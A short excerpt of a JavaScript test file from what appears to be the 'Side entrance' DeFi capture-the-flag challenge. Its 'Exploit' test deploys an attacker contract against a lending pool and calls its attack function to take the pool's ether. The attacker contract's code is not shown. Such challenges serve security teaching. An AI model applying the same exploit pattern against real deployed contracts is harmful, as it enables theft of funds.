...
describe("[Challenge] Side entrance", function () {
  ...
  it("Exploit", async function () {
    ...
    const AttackerContract: AttackerContract__factory =
      await ethers.getContractFactory("AttackerContract", attacker);

    const transferAttack: AttackerContract = await AttackerContract.deploy(
      this.pool.address,
      attacker.address
    );
    ...
    await transferAttack.connect(attacker).attack(ETHER_IN_POOL);
  });
